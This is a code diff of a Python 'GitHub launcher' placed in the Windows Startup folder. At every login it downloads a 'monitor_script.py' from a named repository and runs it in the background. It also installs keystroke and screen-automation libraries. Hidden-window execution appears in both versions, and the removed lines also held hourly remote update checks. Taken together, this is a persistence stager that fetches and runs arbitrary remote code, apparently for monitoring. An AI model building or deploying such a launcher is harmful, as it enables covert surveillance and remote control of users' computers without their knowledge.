@@ -1,268 +1,280 @@
-# github_launcher.pyw - Auto-updating launcher from GitHub
+# Startup.py - Corrected GitHub launcher
 import os
 import sys
 import subprocess
 import urllib.request
-import urllib.error
 import json
 import tempfile
 import traceback
 import time
 import hashlib
+from datetime import datetime
 from pathlib import Path
-import threading
 
-# Configuration
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main"  # Change this
-MAIN_SCRIPT_URL = f"{GITHUB_RAW_URL}/monitor_script.py"
-REQUIREMENTS_URL = f"{GITHUB_RAW_URL}/requirements.txt"
-CONFIG_URL = f"{GITHUB_RAW_URL}/config.json"
+# ================= CONFIGURATION =================
+# FIXED: Use raw.githubusercontent.com NOT github.com
+GITHUB_USERNAME = "ElianBoden"
+GITHUB_REPO = "Deployer"
+GITHUB_BRANCH = "main"
+# =================================================
+
+# CORRECT GitHub URLs
+BASE_URL = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{GITHUB_REPO}/{GITHUB_BRANCH}"
+MAIN_SCRIPT_URL = f"{BASE_URL}/monitor_script.py"
+REQUIREMENTS_URL = f"{BASE_URL}/requirements.txt"
 
 # Local paths
 STARTUP_FOLDER = Path(os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'))
-LOCAL_SCRIPT_PATH = STARTUP_FOLDER / "current_script.py"
-LOCAL_CONFIG_PATH = STARTUP_FOLDER / "config.json"
-CACHE_FILE = STARTUP_FOLDER / "script_cache.json"
+LOCAL_SCRIPT = STARTUP_FOLDER / "monitor_script.py"
+LOG_FILE = STARTUP_FOLDER / "startup_log.txt"
+CACHE_FILE = STARTUP_FOLDER / "update_cache.json"
 
-def hide_console():
-    """Hide console window"""
+def log(message, error=False):
+    """Log to console and file"""
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    msg = f"[{timestamp}] {message}"
+    
+    # Print to console
+    if error:
+        print(f"\033[91m{msg}\033[0m")  # Red for errors
+    else:
+        print(msg)
+    
+    # Write to log file
     try:
-        import win32gui
-        import win32con
-        hwnd = win32gui.GetForegroundWindow()
-        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+        with open(LOG_FILE, 'a', encoding='utf-8') as f:
+            f.write(msg + '\n')
     except:
         pass
 
-def download_file(url, local_path):
-    """Download file from URL"""
+def test_github_access():
+    """Test if we can access GitHub"""
+    test_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/README.md"
     try:
-        print(f"Downloading {url}")
-        req = urllib.request.Request(url)
-        req.add_header('Cache-Control', 'no-cache')
-        
-        with urllib.request.urlopen(req, timeout=10) as response:
-            content = response.read()
-            
-        with open(local_path, 'wb') as f:
-            f.write(content)
-            
+        log("Testing GitHub access...")
+        response = urllib.request.urlopen(test_url, timeout=10)
+        log(f"✓ GitHub accessible (Status: {response.status})")
         return True
     except Exception as e:
-        print(f"Download failed: {e}")
+        log(f"✗ Cannot access GitHub: {e}", error=True)
         return False
 
-def get_file_hash(filepath):
-    """Get SHA256 hash of file"""
-    if not os.path.exists(filepath):
-        return None
-    with open(filepath, 'rb') as f:
-        return hashlib.sha256(f.read()).hexdigest()
-
-def check_for_updates():
-    """Check if GitHub version is newer than local"""
-    if not os.path.exists(CACHE_FILE):
-        return True
+def download_from_github(url, local_path):
+    """Download file from GitHub with retry"""
+    for attempt in range(3):
+        try:
+            log(f"Download attempt {attempt + 1}: {url}")
+            
+            # Add headers to prevent caching
+            headers = {
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
+                'User-Agent': 'Mozilla/5.0'
+            }
+            
+            req = urllib.request.Request(url, headers=headers)
+            
+            with urllib.request.urlopen(req, timeout=15) as response:
+                if response.status == 200:
+                    content = response.read()
+                    
+                    # Save file
+                    with open(local_path, 'wb') as f:
+                        f.write(content)
+                    
+                    log(f"✓ Downloaded {len(content)} bytes")
+                    return True
+                else:
+                    log(f"✗ HTTP {response.status}", error=True)
+                    
+        except urllib.error.HTTPError as e:
+            log(f"✗ HTTP Error {e.code}: {e.reason}", error=True)
+            
+            # More specific error messages
+            if e.code == 404:
+                log(f"✗ File not found at: {url}", error=True)
+                log("Make sure:", error=True)
+                log(f"1. Repository exists: https://github.com/{GITHUB_USERNAME}/{GITHUB_REPO}", error=True)
+                log(f"2. Branch exists: {GITHUB_BRANCH}", error=True)
+                log(f"3. File exists: monitor_script.py in root folder", error=True)
+                log(f"4. Repository is public", error=True)
+                return False
+                
+        except Exception as e:
+            log(f"✗ Download failed: {type(e).__name__}: {e}", error=True)
+        
+        if attempt < 2:
+            log(f"Retrying in 2 seconds...")
+            time.sleep(2)
     
-    try:
-        with open(CACHE_FILE, 'r') as f:
-            cache = json.load(f)
-        
-        # Check GitHub for latest hash
-        req = urllib.request.Request(MAIN_SCRIPT_URL)
-        req.add_header('Cache-Control', 'no-cache')
-        with urllib.request.urlopen(req, timeout=10) as response:
-            github_content = response.read()
-            github_hash = hashlib.sha256(github_content).hexdigest()
-        
-        return cache.get('script_hash') != github_hash
-    except:
-        return True
-
-def update_cache(github_hash):
-    """Update local cache with latest hash"""
-    cache = {
-        'script_hash': github_hash,
-        'last_update': time.time(),
-        'version': int(time.time())
-    }
-    with open(CACHE_FILE, 'w') as f:
-        json.dump(cache, f)
-
-def install_requirements():
-    """Install required packages from requirements.txt"""
-    try:
-        # Download requirements.txt
-        req_path = tempfile.gettempdir() + "/requirements.txt"
-        if download_file(REQUIREMENTS_URL, req_path):
-            print("Installing requirements...")
-            
-            # Use pip to install
-            subprocess.check_call([
-                sys.executable, "-m", "pip", "install", 
-                "--upgrade", "-r", req_path,
-                "--quiet", "--user"
-            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            print("Requirements installed successfully")
-            return True
-    except Exception as e:
-        print(f"Failed to install requirements: {e}")
-        # Try individual packages as fallback
-        install_fallback_packages()
     return False
 
-def install_fallback_packages():
-    """Fallback: Install packages individually"""
-    packages = [
+def install_requirements():
+    """Install required packages"""
+    log("Checking requirements...")
+    
+    # Try to download requirements.txt
+    req_path = tempfile.gettempdir() + "/requirements.txt"
+    if download_from_github(REQUIREMENTS_URL, req_path):
+        try:
+            log("Installing from requirements.txt...")
+            result = subprocess.run(
+                [sys.executable, "-m", "pip", "install", "-r", req_path],
+                capture_output=True,
+                text=True,
+                timeout=120
+            )
+            
+            if result.returncode == 0:
+                log("✓ Requirements installed")
+                # Show what was installed
+                for line in result.stdout.split('\n'):
+                    if 'Successfully installed' in line:
+                        log(f"  {line}")
+                return True
+            else:
+                log(f"✗ pip failed: {result.stderr}", error=True)
+        except subprocess.TimeoutExpired:
+            log("✗ Installation timed out", error=True)
+    else:
+        log("No requirements.txt found, installing defaults...", error=True)
+    
+    # Fallback to default packages
+    default_packages = [
         "pywin32",
-        "pyautogui", 
+        "pyautogui",
         "keyboard",
         "requests",
         "pillow"
     ]
     
-    for package in packages:
+    for package in default_packages:
         try:
-            print(f"Installing {package}...")
-            subprocess.check_call([
-                sys.executable, "-m", "pip", "install", 
-                package, "--quiet", "--user"
-            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except:
-            print(f"Failed to install {package}")
+            log(f"Installing {package}...")
+            subprocess.run(
+                [sys.executable, "-m", "pip", "install", package],
+                capture_output=True,
+                timeout=30
+            )
+            log(f"  ✓ {package}")
+        except Exception as e:
+            log(f"  ✗ {package}: {e}", error=True)
+    
+    return True
 
-def download_latest_script():
-    """Download latest script and requirements from GitHub"""
-    print("Checking for updates...")
-    
-    if not check_for_updates():
-        print("Already up to date")
-        if os.path.exists(LOCAL_SCRIPT_PATH):
-            return True
-        else:
-            # Force download if local file is missing
-            pass
-    
-    print("New version available, downloading...")
-    
-    # Download main script
-    if download_file(MAIN_SCRIPT_URL, LOCAL_SCRIPT_PATH):
-        # Download requirements.txt
-        if os.path.exists(REQUIREMENTS_URL):
-            install_requirements()
-        
-        # Download config if exists
-        try:
-            download_file(CONFIG_URL, LOCAL_CONFIG_PATH)
-        except:
-            pass
-        
-        # Update cache with new hash
-        github_hash = get_file_hash(LOCAL_SCRIPT_PATH)
-        if github_hash:
-            update_cache(github_hash)
-        
-        return True
-    
-    return False
-
-def run_script():
-    """Execute the downloaded script"""
-    if not os.path.exists(LOCAL_SCRIPT_PATH):
-        print("No script found to run")
+def run_monitor_script():
+    """Run the downloaded script"""
+    if not os.path.exists(LOCAL_SCRIPT):
+        log("✗ No script to run", error=True)
         return False
     
     try:
-        print("Starting main script...")
+        log("Starting monitor script...")
         
-        # Read and execute the script
-        with open(LOCAL_SCRIPT_PATH, 'r', encoding='utf-8') as f:
-            script_code = f.read()
+        # Read and check the script
+        with open(LOCAL_SCRIPT, 'r', encoding='utf-8') as f:
+            script_content = f.read()
         
-        # Create a new process to run the script
-        # This allows the launcher to continue running separately
-        subprocess.Popen([
-            sys.executable, LOCAL_SCRIPT_PATH
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        log(f"Script size: {len(script_content)} bytes")
+        
+        # Basic validation
+        if "import" not in script_content:
+            log("✗ Script doesn't contain imports - may be invalid", error=True)
+            return False
+        
+        # Run in background
+        if sys.platform == "win32":
+            # On Windows, run with CREATE_NO_WINDOW to hide console
+            import subprocess
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            
+            process = subprocess.Popen(
+                [sys.executable, LOCAL_SCRIPT],
+                startupinfo=startupinfo
+            )
+        else:
+            process = subprocess.Popen(
+                [sys.executable, LOCAL_SCRIPT],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+        
+        log(f"✓ Monitor started (PID: {process.pid})")
+        
+        # Check if it's still running after 2 seconds
+        time.sleep(2)
+        if process.poll() is not None:
+            log("✗ Monitor stopped immediately", error=True)
+            return False
         
         return True
         
     except Exception as e:
-        print(f"Failed to run script: {e}")
-        print(traceback.format_exc())
+        log(f"✗ Failed to run script: {e}", error=True)
+        log(traceback.format_exc(), error=True)
         return False
 
 def main():
     """Main launcher function"""
-    # Hide console if running as .pyw
-    if sys.executable.endswith("pythonw.exe") or sys.argv[0].endswith(".pyw"):
-        hide_console()
+    print("\n" + "="*60)
+    print("GitHub Auto-Deploy Launcher")
+    print("="*60)
     
-    # Ensure we're in startup folder
-    os.chdir(STARTUP_FOLDER)
+    log(f"Starting at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    log(f"Python: {sys.version}")
+    log(f"Startup folder: {STARTUP_FOLDER}")
+    log(f"GitHub repo: {GITHUB_USERNAME}/{GITHUB_REPO}")
     
-    print("=" * 50)
-    print("GitHub Auto-Updating Launcher")
-    print("=" * 50)
+    # Test GitHub access first
+    if not test_github_access():
+        log("Continuing with local cache if available...")
     
-    # Initial delay to ensure network is ready
-    time.sleep(5)
-    
-    retry_count = 0
-    max_retries = 3
-    
-    while retry_count < max_retries:
+    # Download latest script
+    log("\n[STEP 1] Downloading script from GitHub...")
+    if download_from_github(MAIN_SCRIPT_URL, LOCAL_SCRIPT):
+        log("✓ Script downloaded successfully")
+        
+        # Show first few lines
         try:
-            # Download latest version
-            if download_latest_script():
-                # Run the script
-                if run_script():
-                    print("Launcher completed successfully")
-                    break
-                else:
-                    print("Failed to run script")
-            else:
-                print("Failed to download script")
-            
-        except Exception as e:
-            print(f"Error in launcher: {e}")
-            retry_count += 1
-            
-            if retry_count < max_retries:
-                print(f"Retrying in 30 seconds... (Attempt {retry_count + 1}/{max_retries})")
-                time.sleep(30)
-            else:
-                print("Max retries reached. Exiting.")
+            with open(LOCAL_SCRIPT, 'r', encoding='utf-8') as f:
+                first_line = f.readline().strip()
+                log(f"First line: {first_line[:80]}...")
+        except:
+            pass
+    else:
+        # Check if we have a cached version
+        if os.path.exists(LOCAL_SCRIPT):
+            log("Using cached version from previous run")
+        else:
+            log("✗ No script available, exiting", error=True)
+            input("Press Enter to exit...")
+            return
     
-    # Keep launcher running to check for updates periodically
-    start_update_checker()
-
-def start_update_checker():
-    """Background thread to check for updates periodically"""
-    def update_checker():
-        while True:
-            time.sleep(3600)  # Check every hour
-            
-            try:
-                if check_for_updates():
-                    print("Update found! Downloading...")
-                    download_latest_script()
-                    
-                    # Restart script if it's not running
-                    # You might want to add process monitoring here
-            except:
-                pass
+    # Install requirements
+    log("\n[STEP 2] Installing dependencies...")
+    install_requirements()
     
-    thread = threading.Thread(target=update_checker, daemon=True)
-    thread.start()
+    # Run the script
+    log("\n[STEP 3] Launching monitor...")
+    if run_monitor_script():
+        log("✓ Launcher completed successfully")
+    else:
+        log("✗ Failed to launch monitor", error=True)
     
-    # Keep main thread alive
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        pass
+    # Keep console open
+    log("\n" + "="*60)
+    log("Launcher finished. This window can be closed.")
+    log(f"Log saved to: {LOG_FILE}")
+    print("\nPress Enter to close this window...")
+    input()
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        log("Interrupted by user")
+    except Exception as e:
+        log(f"Fatal error: {e}", error=True)
+        log(traceback.format_exc(), error=True)
+        input("Press Enter to close...")
